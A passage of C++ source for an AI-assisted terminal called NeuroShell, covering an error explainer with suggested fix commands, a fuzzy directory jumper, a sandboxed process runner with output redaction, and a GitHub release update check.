            size_t pos = output.find("ModuleNotFoundError: No module named ");
            size_t q1 = output.find("'", pos);
            size_t q2 = output.find("'", q1 + 1);
            if (q1 != std::string::npos && q2 != std::string::npos) {
                std::string pkg = output.substr(q1 + 1, q2 - q1 - 1);
                rep.detail = "Python package '" + pkg + "' is not installed in the active environment.";
                rep.autoFixCmd = "pip install " + pkg;
            }
        }
        // 5. Missing NPM Package
        else if (output.find("Cannot find module ") != std::string::npos) {
            rep.hasError = true;
            rep.category = "Missing NPM Package";
            size_t pos = output.find("Cannot find module ");
            size_t q1 = output.find("'", pos);
            size_t q2 = output.find("'", q1 + 1);
            if (q1 != std::string::npos && q2 != std::string::npos) {
                std::string pkg = output.substr(q1 + 1, q2 - q1 - 1);
                rep.detail = "Node package '" + pkg + "' is missing from node_modules.";
                rep.autoFixCmd = "npm install " + pkg;
            }
        }
        // 6. Access / Permission Denied
        else if (lowerOut.find("access is denied") != std::string::npos || lowerOut.find("permission denied") != std::string::npos) {
            rep.hasError = true;
            rep.category = "Access / Permission Denied";
            rep.detail = "Operation requires administrative privileges or target file/resource is locked.";
#if defined(_WIN32)
            rep.autoFixCmd = "powershell -NoProfile -Command \"Start-Process cmd -ArgumentList '/c " + lastCmd + "' -Verb RunAs\"";
#else
            rep.autoFixCmd = "sudo " + lastCmd;
#endif
        }
        // 7. Git Repositories & Push Errors
        else if (lowerOut.find("not a git repository") != std::string::npos) {
            rep.hasError = true;
            rep.category = "Git Initialization Error";
            rep.detail = "Current directory is not a Git repository. Run 'git init' to initialize.";
            rep.autoFixCmd = "git init";
        }
        else if (lowerOut.find("updates were rejected because the remote contains work") != std::string::npos) {
            rep.hasError = true;
            rep.category = "Git Remote Out of Sync";
            rep.detail = "Remote repository has changes you do not have locally. Rebase or pull first.";
            rep.autoFixCmd = "git pull --rebase";
        }
        else if (lowerOut.find("automatic merge failed; fix conflicts") != std::string::npos) {
            rep.hasError = true;
            rep.category = "Git Merge Conflict";
            rep.detail = "Merge conflicts detected. Inspect modified files to resolve conflicts.";
            rep.autoFixCmd = "git status";
        }
        // 8. Port Conflicts
        else if (lowerOut.find("address already in use") != std::string::npos || lowerOut.find("eaddrinuse") != std::string::npos) {
            rep.hasError = true;
            rep.category = "Network Port Occupied";
            rep.detail = "The network port requested by this server is already in use by another process.";
            rep.autoFixCmd = "netstat -ano";
        }
        // 9. General fallback
        else {
            rep.hasError = true;
            rep.category = "Command Execution Failure (Exit Code " + std::to_string(exitCode) + ")";
            rep.detail = "Command returned an error status. Use '@fix' or run with '--help' for usage.";
            rep.autoFixCmd = "@fix";
        }

        return rep;
    }

    void RenderErrorCard(const ErrorReport& rep) {
        if (!rep.hasError) return;

        std::cout << "\n" << C_RED << "  ╭── 💡 NeuroShell Plain-English Error Explainer ──────────────────────╮\n"
                  << "  │ " << C_BOLD << C_WHITE << "Error Type:   " << C_RESET << C_YELLOW << rep.category << C_RED 
                  << std::string(std::max(0, 52 - (int)rep.category.length()), ' ') << "│\n"
                  << "  │ " << C_BOLD << C_WHITE << "Explanation:  " << C_RESET << rep.detail << C_RED 
                  << std::string(std::max(0, 52 - (int)rep.detail.length()), ' ') << "│\n";

        if (!rep.autoFixCmd.empty()) {
            std::cout << "  │                                                                     │\n"
                      << "  │ " << C_BOLD << C_CYAN << "⚡ Smart Fix Option:                                                " << C_RED << "│\n"
                      << "  │    " << C_GREEN << "❯ " << C_BOLD << rep.autoFixCmd << C_RESET << C_RED 
                      << std::string(std::max(0, 51 - (int)rep.autoFixCmd.length()), ' ') << "│\n"
                      << "  ╰─────────────────────────────────────────────────────────────────────╯" << C_RESET << "\n"
                      << C_YELLOW << "  Press " << C_BOLD << "[y]" << C_RESET << C_YELLOW << " to apply fix immediately, or press Enter to dismiss...\n" << C_RESET;
        } else {
            std::cout << "  ╰─────────────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
        }
    }
};

// ═══════════════════════════════════════════════════════════
// Smart Fuzzy Directory Jumper (z-jump & frecent navigation)
// ═══════════════════════════════════════════════════════════

class SmartDirectoryJumper {
private:
    std::vector<std::string> historyDirs;
    std::map<std::string, std::string> bookmarks;
    std::string lastDir = "";
    std::unordered_set<PlatformFS::FileID, PlatformFS::FileIDHasher> visited;

    std::vector<std::string> Tokenize(const std::string& str) {
        std::vector<std::string> tokens;
        std::istringstream iss(str);
        std::string s;
        while (iss >> s) {
            std::transform(s.begin(), s.end(), s.begin(), ::tolower);
            tokens.push_back(s);
        }
        return tokens;
    }

    bool PathMatchesTokens(const std::string& path, const std::vector<std::string>& tokens) {
        if (tokens.empty()) return false;
        std::string lowerPath = path;
        std::transform(lowerPath.begin(), lowerPath.end(), lowerPath.begin(), ::tolower);

        size_t lastPos = 0;
        for (const auto& tok : tokens) {
            size_t p = lowerPath.find(tok, lastPos);
            if (p == std::string::npos) return false;
            lastPos = p + tok.length();
        }
        return true;
    }

    void RecursiveScan(const fs::path& root, const std::vector<std::string>& tokens, std::vector<std::string>& results, int depth, int maxDepth = 3) {
        if (depth > maxDepth || results.size() >= 20) return;

        PlatformFS::FileID id;
        if (!PlatformFS::GetUniqueID(root, id) || visited.count(id) > 0) {
            return;
        }
        visited.insert(id);

        try {
            for (const auto& entry : fs::directory_iterator(root, fs::directory_options::skip_permission_denied)) {
                if (entry.is_directory()) {
                    std::string pStr = entry.path().string();
                    std::string name = entry.path().filename().string();
                    if (!name.empty() && (name[0] == '.' || name == "node_modules" || name == "__pycache__" || name == "$Recycle.Bin")) {
                        continue;
                    }

                    if (PathMatchesTokens(pStr, tokens)) {
                        results.push_back(pStr);
                    }
                    RecursiveScan(entry.path(), tokens, results, depth + 1, maxDepth);
                }
            }
        } catch (...) {}
    }

public:
    SmartDirectoryJumper() {
        fs::path home = PlatformFS::GetHomeDir();
        if (fs::exists(home / "Desktop")) historyDirs.push_back((home / "Desktop").string());
        if (fs::exists(home / "Downloads")) historyDirs.push_back((home / "Downloads").string());
        if (fs::exists(home / "Documents")) historyDirs.push_back((home / "Documents").string());
        historyDirs.push_back(home.string());
    }

    void Record(const std::string& path) {
        if (path.empty()) return;
        auto it = std::find(historyDirs.begin(), historyDirs.end(), path);
        if (it != historyDirs.end()) historyDirs.erase(it);
        historyDirs.insert(historyDirs.begin(), path);
        if (historyDirs.size() > 100) historyDirs.pop_back();
    }

    void SetBookmark(const std::string& name, const std::string& path) { bookmarks[name] = path; }
    std::string GetBookmark(const std::string& name) { return bookmarks.count(name) ? bookmarks[name] : ""; }
    const std::map<std::string, std::string>& GetBookmarks() const { return bookmarks; }
    void SetLastDir(const std::string& d) { lastDir = d; }
    std::string GetLastDir() const { return lastDir; }

    std::string Jump(const std::string& query, const std::string& currentCwd) {
        if (query.empty()) return "";
        std::string lowerQ = query;
        std::transform(lowerQ.begin(), lowerQ.end(), lowerQ.begin(), ::tolower);
        lowerQ.erase(0, lowerQ.find_first_not_of(" \t\r\n"));
        lowerQ.erase(lowerQ.find_last_not_of(" \t\r\n") + 1);

        fs::path curPath(currentCwd);

        // 1. Direct Parent / Back / Well-Known Special Keywords
        if (lowerQ == ".." || lowerQ == "parent") {
            return curPath.parent_path().string();
        }
        if (lowerQ == "..." || lowerQ == "../..") {
            return curPath.parent_path().parent_path().string();
        }
        if (lowerQ == "...." || lowerQ == "../../..") {
            return curPath.parent_path().parent_path().parent_path().string();
        }
        if (lowerQ == "back" || lowerQ == "-") {
            return lastDir.empty() ? "" : lastDir;
        }
        if (lowerQ == "~" || lowerQ == "home") {
            return PlatformFS::GetHomeDir().string();
        }
        if (lowerQ == "desktop") {
            fs::path d = PlatformFS::GetHomeDir() / "Desktop";
            if (fs::exists(d)) return d.string();
        }
        if (lowerQ == "downloads") {
            fs::path d = PlatformFS::GetHomeDir() / "Downloads";
            if (fs::exists(d)) return d.string();
        }
        if (lowerQ == "documents") {
            fs::path d = PlatformFS::GetHomeDir() / "Documents";
            if (fs::exists(d)) return d.string();
        }

        // 2. Bookmarks
        if (bookmarks.count(query) > 0) return bookmarks[query];
        if (bookmarks.count(lowerQ) > 0) return bookmarks[lowerQ];

        std::vector<std::string> tokens = Tokenize(query);
        if (tokens.empty()) return "";

        // 3. Ancestor Hierarchy Walk (Going UP the current directory tree)
        // e.g. from C:\Users\lenovo\Desktop\IRA\python_brain\ira\autonomy\__pycache__
        // walk up: autonomy -> ira -> python_brain -> IRA -> Desktop
        fs::path walk = curPath.parent_path();
        while (!walk.empty() && walk != walk.root_path()) {
            std::string parentName = walk.filename().string();
            std::string lowerParent = parentName;
            std::transform(lowerParent.begin(), lowerParent.end(), lowerParent.begin(), ::tolower);

            if (lowerParent == lowerQ || PathMatchesTokens(parentName, tokens)) {
                return walk.string();
            }
            walk = walk.parent_path();
        }

        // 4. Direct Subdirectories (Going DOWN into current directory children)
        try {
            for (const auto& entry : fs::directory_iterator(currentCwd)) {
                if (entry.is_directory()) {
                    std::string childName = entry.path().filename().string();
                    std::string lowerChild = childName;
                    std::transform(lowerChild.begin(), lowerChild.end(), lowerChild.begin(), ::tolower);

                    if (lowerChild == lowerQ) {
                        return entry.path().string();
                    }
                }
            }
            for (const auto& entry : fs::directory_iterator(currentCwd)) {
                if (entry.is_directory() && PathMatchesTokens(entry.path().filename().string(), tokens)) {
                    return entry.path().string();
                }
            }
        } catch (...) {}

        // 5. History Directories (Excluding currentCwd to prevent looping!)
        // First Pass: Match directory folder name (basename)
        for (const auto& dir : historyDirs) {
            try {
                if (fs::equivalent(fs::path(dir), curPath)) continue;
            } catch (...) {
                if (dir == currentCwd) continue;
            }

            std::string base = fs::path(dir).filename().string();
            std::string lowerBase = base;
            std::transform(lowerBase.begin(), lowerBase.end(), lowerBase.begin(), ::tolower);
            if (lowerBase == lowerQ || PathMatchesTokens(base, tokens)) {
                return dir;
            }
        }

        // Second Pass: Match full path substring
        for (const auto& dir : historyDirs) {
            try {
                if (fs::equivalent(fs::path(dir), curPath)) continue;
            } catch (...) {
                if (dir == currentCwd) continue;
            }

            if (PathMatchesTokens(dir, tokens)) return dir;
        }

        // 6. Deep Scan (Desktop / Home)
        visited.clear();
        std::vector<std::string> deepMatches;
        fs::path home = PlatformFS::GetHomeDir();
        fs::path desktop = home / "Desktop";
        if (fs::exists(desktop)) RecursiveScan(desktop, tokens, deepMatches, 0, 3);
        if (deepMatches.empty()) RecursiveScan(home, tokens, deepMatches, 0, 2);

        for (const auto& m : deepMatches) {
            try {
                if (!fs::equivalent(fs::path(m), curPath)) return m;
            } catch (...) {
                if (m != currentCwd) return m;
            }
        }

        return "";
    }

    std::vector<std::string> DeepFind(const std::string& query, const std::string& currentCwd) {
        visited.clear();
        std::vector<std::string> tokens = Tokenize(query);
        std::vector<std::string> results;
        RecursiveScan(fs::path(currentCwd), tokens, results, 0, 4);

        if (results.size() < 10) {
            fs::path home = PlatformFS::GetHomeDir();
            fs::path desktop = home / "Desktop";
            if (fs::exists(desktop)) RecursiveScan(desktop, tokens, results, 0, 3);
        }
        return results;
    }

    std::vector<std::string> GetAvailableDirs(const std::string& currentCwd) {
        std::vector<std::string> list;
        try {
            for (const auto& entry : fs::directory_iterator(currentCwd)) {
                if (entry.is_directory()) {
                    list.push_back(entry.path().string());
                    if (list.size() >= 6) break;
                }
            }
        } catch (...) {}
        for (const auto& d : historyDirs) {
            if (std::find(list.begin(), list.end(), d) == list.end()) {
                list.push_back(d);
                if (list.size() >= 10) break;
            }
        }
        return list;
    }
};

// ═══════════════════════════════════════════════════════════
// Cross-Platform Process Spawner & Job Control
// ═══════════════════════════════════════════════════════════

class PlatformProcessRunner {
public:
    struct ExecResult {
        int exitCode = 0;
        std::string output;
    };

    static bool IsInteractiveTUI(const std::string& cmd) {
        std::string lower = cmd;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
        size_t s = lower.find_first_not_of(" \t");
        if (s != std::string::npos) lower = lower.substr(s);

        const std::vector<std::string> tuis = {
            "vim", "vi", "nvim", "nano", "htop", "top", "fzf", "less", "more", "man",
            "ssh", "sftp", "python -i", "python3 -i", "node -i", "pwsh", "powershell", "cmd"
        };
        for (const auto& t : tuis) {
            if (lower == t || lower.rfind(t + " ", 0) == 0) return true;
        }
        if (lower.find("docker exec -it") != std::string::npos || lower.find("docker run -it") != std::string::npos ||
            lower.find("kubectl exec -it") != std::string::npos) {
            return true;
        }
        return false;
    }

#if defined(NEUROSHELL_PLATFORM_WINDOWS)
    static bool ShouldUsePowerShell(const std::string& cmd) {
        std::string lower = cmd;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
        size_t s = lower.find_first_not_of(" \t\r\n");
        if (s != std::string::npos) lower = lower.substr(s);
        if (lower.empty()) return false;

        // Exclude standard CLI commands and python scripts (with or without quotes)
        if (lower.rfind("python", 0) == 0 || lower.rfind("\"python", 0) == 0 ||
            lower.find("python.exe") != std::string::npos ||
            lower.find(".venv") != std::string::npos ||
            lower.rfind("git ", 0) == 0 || lower.rfind("gh ", 0) == 0 ||
            lower.rfind("cargo ", 0) == 0 || lower.rfind("npm ", 0) == 0 ||
            lower.rfind("node ", 0) == 0 || lower.rfind("pip ", 0) == 0 ||
            lower.rfind("winget ", 0) == 0) {
            return false;
        }

        // Explicit PowerShell / pwsh invocation
        if (lower.rfind("powershell", 0) == 0 || lower.rfind("pwsh", 0) == 0) return true;

        // Parenthesized expressions or PowerShell variables ($)
        if (lower[0] == '(' || lower[0] == '$') return true;

        // PowerShell methods / variables / pipe constructs
        if (lower.find(".trim()") != std::string::npos ||
            lower.find("$_") != std::string::npos ||
            lower.find("| where") != std::string::npos ||
            lower.find("| select") != std::string::npos ||
            lower.find("| foreach") != std::string::npos ||
            lower.find("| stop-") != std::string::npos) {
            return true;
        }

        // Standard PowerShell verb-noun cmdlets
        const std::vector<std::string> psVerbs = {
            "get-", "set-", "invoke-", "test-", "start-", "stop-", "restart-",
            "new-", "remove-", "compress-", "expand-", "select-", "where-", "format-",
            "out-", "convertto-", "convertfrom-", "enable-", "disable-", "install-", "update-"
        };
        for (const auto& verb : psVerbs) {
            if (lower.find(verb) != std::string::npos) return true;
        }

        // Compound statements separated by unquoted semicolon (cmd.exe fails on ';'; PowerShell handles it cleanly)
        bool inDq = false;
        bool inSq = false;
        bool hasUnquotedSemicolon = false;
        for (char c : lower) {
            if (c == '"' && !inSq) inDq = !inDq;
            else if (c == '\'' && !inDq) inSq = !inSq;
            else if (c == ';' && !inDq && !inSq) {
                hasUnquotedSemicolon = true;
                break;
            }
        }
        if (hasUnquotedSemicolon && lower.rfind("set ", 0) != 0) {
            return true;
        }

        return false;
    }
#endif

    using LineFilter = std::function<std::string(const std::string&)>;

    // Phase 8 (v5.16): optional kernel confinement. When `sandbox` is
    // non-null and enabled, the POSIX child applies no_new_privs +
    // Landlock + seccomp between fork and exec; a failed application
    // honors fail_closed by refusing to exec (exit 90+step).
    static ExecResult Execute(const std::string& command, const LineFilter& lineFilter = nullptr,
                              const neuroshell::PreparedSandbox* sandbox = nullptr) {
        ExecResult res;

        // Line-buffered filter application: secrets are redacted BEFORE they
        // ever reach the viewport (previously output was displayed raw and
        // only the recorded copy was masked).
        auto emit = [&lineFilter](std::string& pending, const char* data, size_t len,
                                  std::string& rolling, std::mutex& lock, size_t maxCapture, bool isStderr = false) {
            pending.append(data, len);
            size_t nl;
            while ((nl = pending.find('\n')) != std::string::npos) {
                std::string line = pending.substr(0, nl + 1);
                pending.erase(0, nl + 1);
                if (lineFilter) line = lineFilter(line);
                {
                    std::lock_guard<std::mutex> lk(lock);
                    if (isStderr) {
                        std::string text = line;
                        std::string eol = "";
                        while (!text.empty() && (text.back() == '\r' || text.back() == '\n')) {
                            eol = text.back() + eol;
                            text.pop_back();
                        }
                        std::cout << C_RED << text << C_RESET << eol << std::flush;
                    } else {
                        std::cout << line << std::flush;
                    }
                    rolling += line;
                    if (rolling.size() > maxCapture * 2) {
                        rolling.erase(0, rolling.size() - maxCapture);
                    }
                }
            }
        };
        auto flushPending = [&lineFilter](std::string& pending, std::string& rolling,
                                          std::mutex& lock, size_t maxCapture, bool isStderr = false) {
            if (pending.empty()) return;
            std::string line = lineFilter ? lineFilter(pending) : pending;
            {
                std::lock_guard<std::mutex> lk(lock);
                if (isStderr) {
                    std::string text = line;
                    std::string eol = "";
                    while (!text.empty() && (text.back() == '\r' || text.back() == '\n')) {
                        eol = text.back() + eol;
                        text.pop_back();
                    }
                    std::cout << C_RED << text << C_RESET << eol << std::flush;
                } else {
                    std::cout << line << std::flush;
                }
                rolling += line;
                if (rolling.size() > maxCapture * 2) {
                    rolling.erase(0, rolling.size() - maxCapture);
                }
            }
            pending.clear();
        };

        // Passthrough for interactive full-screen TUI apps with ConPTY / openpty
        if (IsInteractiveTUI(command)) {
            int cols = PlatformTerminal::GetWindowColumns();
            int rows = PlatformTerminal::GetWindowRows();
            NeuroShell::PTY::PseudoTerminalHost pty;
            if (pty.Spawn(command, (short)cols, (short)rows)) {
                std::thread outThread([&]() {
                    pty.StreamOutput([](const char* data, size_t len) {
                        std::cout.write(data, len);
                        std::cout.flush();
                    });
                });
                // Critical fix: pump local keystrokes into the child PTY.
                // Previously input was never forwarded, so vim/htop/ssh froze.
                std::thread inThread([&]() {
                    pty.PumpStdinLoop();
                });
                res.exitCode = pty.WaitForExit();
                if (outThread.joinable()) outThread.join();
                if (inThread.joinable()) inThread.join();
                return res;
            }
            res.exitCode = system(command.c_str());
            return res;
        }

#if defined(NEUROSHELL_PLATFORM_WINDOWS)
        HANDLE hJob = CreateJobObjectW(NULL, NULL);
        if (hJob != NULL) {
            JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = { 0 };
            jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
            SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &jeli, sizeof(jeli));
        }

        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle = TRUE;
        sa.lpSecurityDescriptor = NULL;

        HANDLE hOutRead = NULL, hOutWrite = NULL;
        if (!CreatePipe(&hOutRead, &hOutWrite, &sa, 0)) {
            res.exitCode = system(command.c_str());
            if (hJob) CloseHandle(hJob);
            return res;
        }
        SetHandleInformation(hOutRead, HANDLE_FLAG_INHERIT, 0);

        HANDLE hErrRead = NULL, hErrWrite = NULL;
        if (!CreatePipe(&hErrRead, &hErrWrite, &sa, 0)) {
            CloseHandle(hOutRead);
            CloseHandle(hOutWrite);
            res.exitCode = system(command.c_str());
            if (hJob) CloseHandle(hJob);
            return res;
        }
        SetHandleInformation(hErrRead, HANDLE_FLAG_INHERIT, 0);

        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.hStdOutput = hOutWrite;
        si.hStdError = hErrWrite;
        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
        si.dwFlags |= STARTF_USESTDHANDLES;
        ZeroMemory(&pi, sizeof(pi));

        std::string cmdLine;
        std::string trimmedCmd = command;
        size_t firstChar = trimmedCmd.find_first_not_of(" \t\r\n");
        if (firstChar != std::string::npos) trimmedCmd = trimmedCmd.substr(firstChar);

        // Windows URL & start command sanitization:
        // In cmd.exe, `&` is a command separator. If `start` opens a URL containing `&` without quotes,
        // cmd.exe splits it into multiple commands. Furthermore, `start "url"` treats url as window title!
        // Normalize any `start <url>` to `start "" "<url>"`.
        std::string lowerCmd = trimmedCmd;
        std::transform(lowerCmd.begin(), lowerCmd.end(), lowerCmd.begin(), ::tolower);
        if (lowerCmd.rfind("start ", 0) == 0) {
            std::string arg = trimmedCmd.substr(6);
            size_t as = arg.find_first_not_of(" \t");
            if (as != std::string::npos) arg = arg.substr(as);
            std::string lowerArg = arg;
            std::transform(lowerArg.begin(), lowerArg.end(), lowerArg.begin(), ::tolower);

            // Case A: start http://... or start https://... (unquoted)
            if (lowerArg.rfind("http://", 0) == 0 || lowerArg.rfind("https://", 0) == 0) {
                trimmedCmd = "start \"\" \"" + arg + "\"";
            }
            // Case B: start "http://..." (missing empty title; cmd.exe treats quoted target as title)
            else if (lowerArg.rfind("\"http://", 0) == 0 || lowerArg.rfind("\"https://", 0) == 0) {
                trimmedCmd = "start \"\" " + arg;
            }
        }

        if (ShouldUsePowerShell(trimmedCmd)) {
            if (trimmedCmd.rfind("powershell", 0) == 0 || trimmedCmd.rfind("pwsh", 0) == 0) {
                cmdLine = trimmedCmd;
            } else {
                std::string escaped;
                escaped.reserve(trimmedCmd.size() + 16);
                for (char c : trimmedCmd) {
                    if (c == '"') escaped += "\\\"";
                    else escaped += c;
                }
                std::string callPrefix = (!trimmedCmd.empty() && (trimmedCmd.front() == '"' || trimmedCmd.front() == '\'')) ? "& " : "";
                cmdLine = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"" + callPrefix + escaped + "\"";
            }
        } else {
            if (trimmedCmd.find('"') != std::string::npos) {
                cmdLine = "cmd.exe /s /c \"" + trimmedCmd + "\"";
            } else {
                cmdLine = "cmd.exe /c " + trimmedCmd;
            }
        }

        std::vector<char> cmdBuf(cmdLine.begin(), cmdLine.end());
        cmdBuf.push_back('\0');

        BOOL success = CreateProcessA(NULL, cmdBuf.data(), NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
        CloseHandle(hOutWrite);
        CloseHandle(hErrWrite);

        if (!success) {
            CloseHandle(hOutRead);
            CloseHandle(hErrRead);
            if (hJob) CloseHandle(hJob);
            res.exitCode = system(cmdLine.c_str());
            return res;
        }

        if (hJob != NULL) AssignProcessToJobObject(hJob, pi.hProcess);
        ResumeThread(pi.hThread);

        std::string rollingOutput = "";
        std::mutex outLock;
        const size_t MAX_CAPTURE = 65536;

        std::thread outReader([&]() {
            char buffer[4096];
            DWORD bytesRead = 0;
            std::string pending;
            while (ReadFile(hOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                emit(pending, buffer, bytesRead, rollingOutput, outLock, MAX_CAPTURE, false);
            }
            flushPending(pending, rollingOutput, outLock, MAX_CAPTURE, false);
        });

        std::thread errReader([&]() {
            char buffer[4096];
            DWORD bytesRead = 0;
            std::string pending;
            while (ReadFile(hErrRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                emit(pending, buffer, bytesRead, rollingOutput, outLock, MAX_CAPTURE, true);
            }
            flushPending(pending, rollingOutput, outLock, MAX_CAPTURE, true);
        });

        WaitForSingleObject(pi.hProcess, INFINITE);
        DWORD dwExit = 0;
        GetExitCodeProcess(pi.hProcess, &dwExit);
        res.exitCode = static_cast<int>(dwExit);

        if (outReader.joinable()) outReader.join();
        if (errReader.joinable()) errReader.join();

        {
            std::lock_guard<std::mutex> lock(outLock);
            res.output = std::move(rollingOutput);
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hOutRead);
        CloseHandle(hErrRead);
        if (hJob) CloseHandle(hJob);
#else
        int outpipe[2];
        if (pipe(outpipe) == -1) {
            res.exitCode = system(command.c_str());
            return res;
        }
        int errpipe[2];
        if (pipe(errpipe) == -1) {
            close(outpipe[0]);
            close(outpipe[1]);
            res.exitCode = system(command.c_str());
            return res;
        }

        pid_t pid = fork();
        if (pid < 0) {
            close(outpipe[0]);
            close(outpipe[1]);
            close(errpipe[0]);
            close(errpipe[1]);
            res.exitCode = system(command.c_str());
            return res;
        }

        if (pid == 0) {
            setpgid(0, 0); // Isolate child in new process group
            close(outpipe[0]);
            close(errpipe[0]);
            dup2(outpipe[1], STDOUT_FILENO);
            dup2(errpipe[1], STDERR_FILENO);
            close(outpipe[1]);
            close(errpipe[1]);

            // Phase 8: kernel confinement (Landlock + seccomp + NNP).
            if (sandbox && sandbox->enabled) {
                int sbrc = sandbox->ApplyInChild();
                if (sbrc != neuroshell::SBX_OK) _exit(90 + sbrc);
            }

            const char* shell = getenv("SHELL");
            if (!shell) shell = "/bin/sh";
            execl(shell, shell, "-c", command.c_str(), (char*)NULL);
            _exit(127);
        }

        close(outpipe[1]);
        close(errpipe[1]);
        std::string rollingOutput = "";
        std::mutex outLock;
        const size_t MAX_CAPTURE = 65536;

        g_foreground_pgid.store(pid, std::memory_order_relaxed);

        std::thread outReader([&]() {
            char buffer[4096];
            ssize_t n = 0;
            std::string pending;
            while ((n = read(outpipe[0], buffer, sizeof(buffer) - 1)) > 0) {
                emit(pending, buffer, (size_t)n, rollingOutput, outLock, MAX_CAPTURE, false);
            }
            flushPending(pending, rollingOutput, outLock, MAX_CAPTURE, false);
        });

        std::thread errReader([&]() {
            char buffer[4096];
            ssize_t n = 0;
            std::string pending;
            while ((n = read(errpipe[0], buffer, sizeof(buffer) - 1)) > 0) {
                emit(pending, buffer, (size_t)n, rollingOutput, outLock, MAX_CAPTURE, true);
            }
            flushPending(pending, rollingOutput, outLock, MAX_CAPTURE, true);
        });

        int status = 0;
        waitpid(pid, &status, 0);
        g_foreground_pgid.store(0, std::memory_order_relaxed);
        if (WIFEXITED(status)) res.exitCode = WEXITSTATUS(status);
        else if (WIFSIGNALED(status)) res.exitCode = 128 + WTERMSIG(status);
        else res.exitCode = 1;

        if (outReader.joinable()) outReader.join();
        if (errReader.joinable()) errReader.join();
        close(outpipe[0]);
        close(errpipe[0]);

        {
            std::lock_guard<std::mutex> lock(outLock);
            res.output = std::move(rollingOutput);
        }
#endif
        return res;
    }
};

// ═══════════════════════════════════════════════════════════
// Master Native C++ Terminal Application Class
// ═══════════════════════════════════════════════════════════

class EnterpriseTerminalHost {
private:
    std::string activeProvider = "native";
    std::string activeModel = "embeddinggemma-2-270m";
    std::string activeTheme = "Cyberpunk Neon";

    PredictionEngine predictor;
    SyntaxHighlighter highlighter;
    SmartErrorShield errorShield;
    SmartDirectoryJumper jumper;
    PlatformTerminal terminal;
    NeuroShell::IPC::NeuroIPCClient ipcClient;
    neuroshell::DLPMasker dlpMasker;
    neuroshell::SHMRingBuffer shmRing;
    // Phase 2 (v5.10): daemon → host token-stream ring (ABI v3)
    neuroshell::SHMRingBuffer shmStreamRing{neuroshell::SHM_STREAM_WIN_NAME,
                                            neuroshell::SHM_STREAM_POSIX_NAME};
    neuroshell::StreamRecorder streamRecorder;
    neuroshell::SplitPaneManager splitPanes;
    neuroshell::InTerminalCommandPalette cmdPalette;
    neuroshell::TaskSupervisor taskSupervisor;

    std::vector<HistoryEntry> history;
    int historyIndex = 0;
    // Phase 3 (v5.11): SQLite+FTS5 ranked history (shared with the Python
    // daemon's ~/.neuroshell/history.db). Falls back to history.txt when no
    // system SQLite library can be loaded.
    neuroshell::HistoryEngine historyDb;
    // Phase 5 (v5.13): Universal Undo — CoW snapshots of write-targets.
    neuroshell::UndoEngine undoEngine{PlatformFS::GetHomeDir() / ".neuroshell" / "undo"};
    // Phase 8 (v5.16): kernel sandbox mode. Default `project` = confine
    // AI-translated commands to the project directory via Landlock+seccomp;
    // user-typed commands run unconfined. Env override: NEUROSHELL_SANDBOX.
    neuroshell::SandboxMode sandboxMode = [] {
        neuroshell::SandboxMode m = neuroshell::SandboxMode::Project;
        const char* env = std::getenv("NEUROSHELL_SANDBOX");
        if (env && *env) neuroshell::ParseSandboxMode(env, m);
        return m;
    }();

    std::vector<Tab> tabs;
    int activeTabIdx = 0;

    static inline std::atomic<bool> g_update_available{false};
    static inline std::string g_remote_version = "";
    bool shouldExit = false;
    bool isCyberEdition = false;
    std::string activeScope = "127.0.0.1/32 (Localhost)";

    void CheckForUpdatesAsync() {
        std::thread([]() {
            try {
                fs::path cachePath = PlatformFS::GetHomeDir() / ".neuroshell" / "update_cache.json";
                bool shouldCheck = true;

                if (fs::exists(cachePath)) {
                    std::ifstream f(cachePath);
                    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
                    size_t tsPos = content.find("\"last_check\":");
                    if (tsPos != std::string::npos) {
                        long long lastCheck = std::stoll(content.substr(tsPos + 13));
                        long long now = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
                        if (now - lastCheck < 86400) { // 24 hours
                            shouldCheck = false;
                            size_t verPos = content.find("\"latest_version\":\"");
                            if (verPos != std::string::npos) {
                                size_t endVer = content.find("\"", verPos + 18);
                                if (endVer != std::string::npos) {
                                    std::string cachedVer = content.substr(verPos + 18, endVer - verPos - 18);
                                    if (!cachedVer.empty() && neuroshell::version::IsNewerRelease(cachedVer)) {
                                        g_remote_version = cachedVer;
                                        g_update_available.store(true);
                                    }
                                }
                            }
                        }
                    }
                }

                if (shouldCheck) {
#if defined(_WIN32)
                    std::string apiCmd = "powershell -NoProfile -Command \"try { (Invoke-RestMethod -Uri 'https://api.github.com/repos/abneeshsingh21/neuroshell/releases/latest' -TimeoutSec 3).tag_name } catch {}\"";
                    FILE* pipe = _popen(apiCmd.c_str(), "r");
#else
                    std::string apiCmd = "curl -s -m 3 https://api.github.com/repos/abneeshsingh21/neuroshell/releases/latest | grep '\"tag_name\":' | sed -E 's/.*\"([^\"]+)\".*/\\1/'";
                    FILE* pipe = popen(apiCmd.c_str(), "r");
#endif
                    if (pipe) {
                        char buf[128];
                        std::string tag = "";
                        if (fgets(buf, sizeof(buf), pipe)) {
                            tag = buf;
                            while (!tag.empty() && (tag.back() == '\r' || tag.back() == '\n' || tag.back() == ' ')) tag.pop_back();
                            if (tag.rfind("v", 0) == 0) tag = tag.substr(1);
                        }
#if defined(_WIN32)
                        _pclose(pipe);
#else
                        pclose(pipe);
#endif
                        if (!tag.empty()) {
                            long long now = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
                            fs::create_directories(cachePath.parent_path());
                            std::ofstream out(cachePath);
